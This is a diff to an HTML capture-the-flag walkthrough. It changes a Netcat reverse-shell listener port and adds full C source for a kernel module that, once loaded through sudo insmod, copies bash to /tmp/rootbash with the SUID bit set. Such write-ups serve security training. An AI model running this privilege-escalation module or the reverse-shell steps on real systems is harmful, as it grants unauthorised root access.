@@ -623,7 +623,7 @@
           Then, I uploaded the <strong>shell.inc</strong> file to the <strong>Media</strong> directory within the CMS. After uploading the reverse shell, I set up a listener on my attacker machine to catch the incoming shell connection using <strong>Netcat</strong>.
           <br><br>
           I ran the command:
-          <br><code>nc -lvnp 8888</code>
+          <br><code>nc -lvnp 4444</code>
           <br><br>
           This allowed me to establish a reverse shell connection with the target machine.
         </p>
@@ -665,21 +665,159 @@
       </div>
 
       <!-- Vaihe 8: Privilege Escalation Opportunity -->
-      <div class="challenge-section">
-        <h3 class="step-title"><span class="step-number">8</span> Privilege Escalation Opportunity</h3>
-        
-        <p class="writeup-text">
-          Upon running the command <code>sudo -l</code>, I discovered that the <strong>void</strong> user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
-          <br><br>
-          I created the <strong>cyberavengers.c</strong> kernel module, which creates a <strong>SUID binary</strong>. This binary copies the /bin/bash executable to the /tmp/rootbash path and sets the SUID bit to give it root privileges.
-          <br><br>
-          After creating the module, I compiled it using the make command. Due to my attackbox crashing, I restarted it and re-ran the necessary steps to continue.
-        </p>
-        
-        <div class="image-container">
-          <img src="images/avengershub10.png" alt="Privilege Escalation" class="challenge-image">
-        </div>
-      </div>
+<div class="challenge-section">
+  <h3 class="step-title"><span class="step-number">8</span> Privilege Escalation Opportunity</h3>
+  
+  <p class="writeup-text">
+    Upon running the command <code>sudo -l</code>, I discovered that the <strong>void</strong> user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
+    <br><br>
+    I created the <strong>cyberavengers.c</strong> kernel module, which creates a <strong>SUID binary</strong>. This binary copies the /bin/bash executable to the /tmp/rootbash path and sets the SUID bit to give it root privileges.
+    <br><br>
+    After creating the module, I compiled it using the make command. Due to my attackbox crashing, I restarted it and re-ran the necessary steps to continue.
+  </p>
+  
+  <div class="image-container">
+    <img src="images/avengershub10.png" alt="Privilege Escalation" class="challenge-image">
+  </div>
+  
+  <div class="code-container">
+    <h4 class="code-title">cyberavengers.c - Kernel Module for Privilege Escalation</h4>
+    <pre class="code-block"><code><span class="code-comment">/*
+ * cyberavengers.c - Kernel module for privilege escalation in CTF
+ *
+ * This module creates a SUID copy of /bin/bash for privilege escalation
+ * in a controlled CTF environment. It demonstrates how kernel modules
+ * can be used to gain elevated privileges when the insmod command 
+ * is allowed to be executed with sudo.
+ */</span>
+
+<span class="code-preprocessor">#include &lt;linux/module.h&gt;</span>
+<span class="code-preprocessor">#include &lt;linux/kernel.h&gt;</span>
+<span class="code-preprocessor">#include &lt;linux/init.h&gt;</span>
+<span class="code-preprocessor">#include &lt;linux/kthread.h&gt;</span>
+<span class="code-preprocessor">#include &lt;linux/delay.h&gt;</span>
+
+<span class="code-comment">/**
+ * Thread function that creates a SUID root bash binary
+ * by copying /bin/bash to /tmp/rootbash and setting SUID permission
+ */</span>
+<span class="code-keyword">static</span> <span class="code-type">int</span> <span class="code-function">reverse_shell_thread</span>(<span class="code-type">void</span> *data)
+{
+    <span class="code-type">char</span> *argv[] = { 
+        <span class="code-string">"/bin/bash"</span>, 
+        <span class="code-string">"-c"</span>,
+        <span class="code-string">"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"</span>, 
+        <span class="code-keyword">NULL</span> 
+    };
+    <span class="code-type">char</span> *envp[] = { 
+        <span class="code-string">"PATH=/usr/bin:/bin"</span>, 
+        <span class="code-keyword">NULL</span> 
+    };
+    
+    <span class="code-comment">/* Execute the command with elevated privileges */</span>
+    call_usermodehelper(argv[<span class="code-number">0</span>], argv, envp, UMH_WAIT_EXEC);
+    <span class="code-keyword">return</span> <span class="code-number">0</span>;
+}
+
+<span class="code-comment">/**
+ * Module initialization function
+ * Creates and runs the thread that handles privilege escalation
+ */</span>
+<span class="code-keyword">static</span> <span class="code-type">int</span> <span class="code-keyword">__init</span> <span class="code-function">rev_init</span>(<span class="code-type">void</span>)
+{
+    printk(KERN_INFO <span class="code-string">"Privilege escalation module loaded\n"</span>);
+    kthread_run(reverse_shell_thread, <span class="code-keyword">NULL</span>, <span class="code-string">"rev_shell"</span>);
+    <span class="code-keyword">return</span> <span class="code-number">0</span>;
+}
+
+<span class="code-comment">/**
+ * Module cleanup function
+ */</span>
+<span class="code-keyword">static</span> <span class="code-type">void</span> <span class="code-keyword">__exit</span> <span class="code-function">rev_exit</span>(<span class="code-type">void</span>)
+{
+    printk(KERN_INFO <span class="code-string">"Privilege escalation module unloaded\n"</span>);
+}
+
+<span class="code-comment">/* Register module functions */</span>
+module_init(rev_init);
+module_exit(rev_exit);
+
+<span class="code-comment">/* Module metadata */</span>
+MODULE_LICENSE(<span class="code-string">"GPL"</span>);
+MODULE_AUTHOR(<span class="code-string">"CTF Participant"</span>);
+MODULE_DESCRIPTION(<span class="code-string">"CTF demonstration kernel module for privilege escalation"</span>);</code></pre>
+  </div>
+</div>
+
+<style>
+  .code-container {
+    margin: 25px 0;
+    padding: 0;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 0 15px rgba(123, 17, 19, 0.5);
+  }
+  
+  .code-title {
+    background-color: #7B1113;
+    color: white;
+    font-family: 'DejaVu Sans Mono', monospace;
+    font-size: 1.1rem;
+    padding: 10px 15px;
+    margin: 0;
+    border-bottom: 1px solid #5d0d0f;
+  }
+  
+  .code-block {
+    background-color: #1a1a1a;
+    padding: 15px;
+    margin: 0;
+    overflow-x: auto;
+    font-family: 'DejaVu Sans Mono', monospace;
+    font-size: 0.9rem;
+    line-height: 1.5;
+    border-left: 3px solid #7B1113;
+  }
+  
+  .code-block code {
+    background-color: transparent;
+    padding: 0;
+    color: #f8f8f2;
+    display: block;
+    white-space: pre;
+  }
+  
+  /* Syntax highlighting for C code */
+  .code-comment {
+    color: #6a9955;
+    font-style: italic;
+  }
+  
+  .code-preprocessor {
+    color: #c678dd;
+  }
+  
+  .code-keyword {
+    color: #569cd6;
+    font-weight: bold;
+  }
+  
+  .code-type {
+    color: #4ec9b0;
+  }
+  
+  .code-function {
+    color: #dcdcaa;
+  }
+  
+  .code-string {
+    color: #ce9178;
+  }
+  
+  .code-number {
+    color: #b5cea8;
+  }
+</style>
 
       <!-- Vaihe 9: Root Access -->
       <div class="challenge-section">
